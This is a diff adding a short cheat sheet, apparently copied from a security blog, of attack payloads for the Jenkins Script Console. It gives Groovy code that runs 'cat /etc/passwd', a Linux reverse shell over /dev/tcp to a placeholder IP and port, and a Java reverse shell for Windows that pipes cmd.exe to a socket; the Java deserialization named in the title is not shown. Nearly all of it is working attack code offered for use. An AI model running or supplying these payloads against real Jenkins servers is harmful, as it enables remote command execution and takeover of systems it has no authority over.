@@ -1,0 +1,29 @@
+Jenkins Script Console Code Exec & Reverse Shell & Java Deserialization
+-------------------------------------------------
+Jenkins Code Execution via Script Console:
+
+def command = "cat /etc/passwd"
+def proc = command.execute()
+proc.waitFor()
+
+println "Process exit code: ${proc.exitValue()}"
+println "Std Err: ${proc.err.text}"
+println "Std Out: ${proc.in.text}"
+-------------------------------------------------
+Getting Reverse Shell on Linux Machine:
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+-------------------------------------------------
+Getting Reverse Shell on Windows Machine
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+-------------------------------------------------
+
+
+
+
+https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/
